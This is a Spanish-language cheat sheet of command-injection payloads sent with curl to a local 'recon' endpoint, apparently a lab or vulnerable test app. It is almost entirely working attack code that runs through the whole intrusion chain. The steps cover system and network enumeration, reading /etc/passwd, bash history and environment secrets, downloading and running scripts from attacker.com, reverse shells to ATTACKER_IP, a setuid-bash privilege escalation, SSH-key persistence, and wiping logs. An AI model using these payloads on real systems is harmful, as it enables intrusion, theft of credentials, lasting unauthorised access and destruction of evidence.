```bash
# Definir variables base
url="localhost:3000/recon?domain=example.com"
ending="&API_KEY=1234"
```

## 1. Enumeración básica de archivos y comandos del sistema

```bash
payload=";ls -la /"
echo "$url$payload$ending"
curl -s -X POST "$url$payload$ending"
```

```bash
payload=";whoami"
echo "$url$payload$ending"
curl -s -X POST "$url$payload$ending"
```

```bash
payload=";id"
echo "$url$payload$ending"
curl -s -X POST "$url$payload$ending"
```

## 2. Enumeración de procesos y red

```bash
payload=";ps aux"
echo "$url$payload$ending"
curl -s -X POST "$url$payload$ending"
```

```bash
payload=";netstat -tulnp"
echo "$url$payload$ending"
curl -s -X POST "$url$payload$ending"
```

```bash
payload=";ifconfig"
echo "$url$payload$ending"
curl -s -X POST "$url$payload$ending"
```

## 3. Acceso a información sensible

```bash
payload=";cat /etc/passwd"
echo "$url$payload$ending"
curl -s -X POST "$url$payload$ending"
```

```bash
payload=";cat ~/.bash_history"
echo "$url$payload$ending"
curl -s -X POST "$url$payload$ending"
```

```bash
payload=";env"
echo "$url$payload$ending"
curl -s -X POST "$url$payload$ending"
```

## 4. Descarga y ejecución remota

```bash
payload=";wget http://attacker.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh"
echo "$url$payload$ending"
curl -s -X POST "$url$payload$ending"
```

```bash
payload=";curl -s http://attacker.com/reverseshell.sh | bash"
echo "$url$payload$ending"
curl -s -X POST "$url$payload$ending"
```

## 5. Reverse Shell

```bash
payload=";bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
echo "$url$payload$ending"
curl -s -X POST "$url$payload$ending"
```

```bash
payload=";nc -e /bin/sh ATTACKER_IP 4444"
echo "$url$payload$ending"
curl -s -X POST "$url$payload$ending"
```

## 6. Escalada de privilegios

```bash
payload=";echo 'chmod u+s /bin/bash' > /tmp/escalate.sh && chmod +x /tmp/escalate.sh && /tmp/escalate.sh"
echo "$url$payload$ending"
curl -s -X POST "$url$payload$ending"
```

## 7. Persistencia

```bash
payload=";mkdir -p ~/.ssh && echo 'TU_CLAVE_PUBLICA' >> ~/.ssh/authorized_keys"
echo "$url$payload$ending"
curl -s -X POST "$url$payload$ending"
```

## 8. Borrar rastros

```bash
payload=";history -c"
echo "$url$payload$ending"
curl -s -X POST "$url$payload$ending"
```

```bash
payload=";rm -rf /var/log/*"
echo "$url$payload$ending"
curl -s -X POST "$url$payload$ending"
```

